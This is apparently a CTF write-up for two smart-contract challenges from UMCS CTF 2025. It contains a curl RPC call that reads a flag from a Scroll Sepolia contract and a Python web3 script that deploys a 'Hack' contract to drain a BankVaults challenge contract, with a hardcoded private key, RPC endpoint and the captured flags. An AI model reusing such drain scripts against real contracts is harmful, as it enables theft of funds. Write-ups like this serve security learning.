## This is 2 challenges compiles:

1. [ZKChallenge](https://github.com/Kr3yzi/CTF-WRITEUPS/new/main/2025/UMCS%20CTF#challenge-)

2. [Bank Vault](https://github.com/Kr3yzi/CTF-WRITEUPS/new/main/2025/UMCS%20CTF#challenge-bank-vault)


## Challenge: ZKChallenge

We are given [smart contract url](https://sepolia.scrollscan.com/address/0xB980702A8C8D32bF0F9381AcCFA271779132f1b2#events)

## Solution 

Im suppose to solve this question is simply to sniff the transactions/find faucet for sepolia scroll and mimic the transaction and get the flag but here is mine: 
```
curl -s -X POST https://sepolia-rpc.scroll.io -H "Content-Type: application/json" --data "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"eth_call\",\"params\":[{\"to\":\"0x27ab8b382e364E9b7C7176BdcceDab1206C88b38\",\"from\":\"0xB980702A8C8D32bF0F9381AcCFA271779132f1b2\",\"data\":\"0xf9633930\"},\"latest\"]}" | jq -r ".result" | xxd -r -p
```

## Flag: ZKChallenge
![image](https://github.com/user-attachments/assets/beb3f82b-f3aa-4208-832d-f4b2c7211ac5)

```
umcs{ZK_i3_s3cr3tly_3asy}
```

## Challenge: Bank Vault 

I don't have any attachment for this question because it was on-site and i FORGOT to do write-up ASAP. 
But as i remember, the challenge given us some kind of big amount to and we need to drain it. 

here is the script to solve this challenge (vibe): 

```
from web3 import Web3
import json

# --- CONFIGURATION ---
RPC_URL = "http://116.203.176.73:4445/25149230-4181-415f-961f-257e348377f9"
PRIVATE_KEY = "f58ae67c53eab0278bb4ada8050c573c06c0aaed7c3511b9fdccd1af091eda2c"
MY_ADDRESS = "0x5573Ab9ccda55928EF494510bDDE04aC104c2081"
SETUP_CONTRACT_ADDR = "0xd6f78F0e43096aaEc7b4858A3bad737676Ae5ccb"

# Load ABI and bytecode for Hack contract (from Remix or your compiler)
with open("Hack.abi") as f:
    HACK_ABI = json.load(f)
with open("Hack.bin") as f:
    HACK_BYTECODE = f.read().strip()

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = w3.eth.account.from_key(PRIVATE_KEY)

# Try to get the real BankVaults contract address from the setup contract
SETUP_ABI = [
    {
        "inputs": [],
        "name": "challengeInstance",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    }
]
try:
    setup = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=SETUP_ABI)
    BANK_VAULTS_ADDR = setup.functions.challengeInstance().call()
    print(f"Real BankVaults contract address: {BANK_VAULTS_ADDR}")
except Exception as e:
    print("Could not fetch challengeInstance from setup contract, using SETUP_CONTRACT_ADDR as vault address.")
    BANK_VAULTS_ADDR = SETUP_CONTRACT_ADDR

# Check wallet balance
balance = w3.eth.get_balance(MY_ADDRESS)
eth_balance = w3.from_wei(balance, 'ether')
print(f"Wallet balance: {eth_balance} ETH")

# Use a bit less than the full balance to leave room for gas
if eth_balance > 0.2:
    deploy_value = w3.to_wei(0.1, 'ether')
elif eth_balance > 0.05:
    deploy_value = w3.to_wei(0.05, 'ether')
else:
    deploy_value = int(balance * 0.8)  # Use 80% of balance if very low

print(f"Deploying Hack contract with {w3.from_wei(deploy_value, 'ether')} ETH...")

# 1. Deploy the Hack contract
nonce = w3.eth.get_transaction_count(MY_ADDRESS)
tx = {
    'from': MY_ADDRESS,
    'nonce': nonce,
    'gas': 2_000_000,
    'gasPrice': w3.to_wei('10', 'gwei'),
    'value': deploy_value
}
Hack = w3.eth.contract(abi=HACK_ABI, bytecode=HACK_BYTECODE)
construct_txn = Hack.constructor(BANK_VAULTS_ADDR).build_transaction(tx)
signed = w3.eth.account.sign_transaction(construct_txn, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
print("Deploying Hack contract...")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
hack_addr = tx_receipt.contractAddress
print(f"Hack contract deployed at: {hack_addr}")

# 2. Call solve() on the Hack contract
nonce = w3.eth.get_transaction_count(MY_ADDRESS)
hack = w3.eth.contract(address=hack_addr, abi=HACK_ABI)
solve_txn = hack.functions.solve().build_transaction({
    'from': MY_ADDRESS,
    'nonce': nonce,
    'gas': 1_000_000,
    'gasPrice': w3.to_wei('10', 'gwei')
})
signed_solve = w3.eth.account.sign_transaction(solve_txn, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_solve.raw_transaction)
print("Calling solve()...")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("Exploit complete!")

# 3. Check if solved via the Setup contract
IS_SOLVED_ABI = [
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    }
]
setup = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=IS_SOLVED_ABI)
print("Solved?", setup.functions.isSolved().call())
```

![image](https://github.com/user-attachments/assets/e1fb3cd9-8ad2-4435-abbe-eb95fcbee0c0)

## Flag: Bank Vault

![image](https://github.com/user-attachments/assets/52a235e3-af71-4fdf-a131-15521bfda38c)

```
umcs{1346770b6250d7f36e4ea86a42816b3c)
```



